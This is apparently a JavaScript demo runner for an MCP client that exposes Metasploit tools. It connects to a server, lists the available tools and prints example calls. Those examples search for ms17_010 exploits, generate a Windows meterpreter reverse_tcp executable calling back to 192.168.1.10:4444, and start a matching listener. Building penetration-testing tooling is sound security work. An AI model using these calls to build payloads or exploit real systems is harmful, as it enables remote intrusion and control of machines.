// Demo Runner for Metasploit MCP Client
import { MetasploitMCPClient } from './working_mcp_client.mjs';

console.log('🚀 Metasploit MCP Client Demo');
console.log('===============================\n');

async function runDemo() {
    const client = new MetasploitMCPClient();
    
    try {
        // Connect
        console.log('📡 Connecting to MCP server...');
        await client.connect();
        console.log('✅ Connected successfully!\n');
        
        // List tools
        console.log('🔧 Available Tools:');
        const tools = await client.listTools();
        tools.forEach((tool, i) => {
            console.log(`   ${i + 1}. ${tool.name} - ${tool.description.substring(0, 60)}...`);
        });
        
        console.log(`\n📊 Total tools available: ${tools.length}`);
        
        // Show some example usage
        console.log('\n📝 Example Usage:');
        console.log('   // Search for exploits');
        console.log('   const exploits = await client.callTool("list_exploits", { search_term: "ms17_010" });');
        console.log('');
        console.log('   // Generate a payload');
        console.log('   const payload = await client.callTool("generate_payload", {');
        console.log('       payload_type: "windows/meterpreter/reverse_tcp",');
        console.log('       format_type: "exe",');
        console.log('       options: { LHOST: "192.168.1.10", LPORT: 4444 }');
        console.log('   });');
        console.log('');
        console.log('   // Start a listener');
        console.log('   const listener = await client.callTool("start_listener", {');
        console.log('       payload_type: "windows/meterpreter/reverse_tcp",');
        console.log('       lhost: "192.168.1.10",');
        console.log('       lport: 4444');
        console.log('   });');
        
        console.log('\n✨ The MCP client is working! You can now use it in your applications.');
        console.log('⚠️  Note: Some tool calls may fail due to MCP SDK formatting issues.');
        console.log('    This is a known SDK bug, not an issue with your setup.');
        
    } catch (error) {
        console.error('\n❌ Error:', error.message);
    } finally {
        await client.disconnect();
        console.log('\n👋 Disconnected from server');
    }
}

// Run the demo
runDemo().catch(console.error); 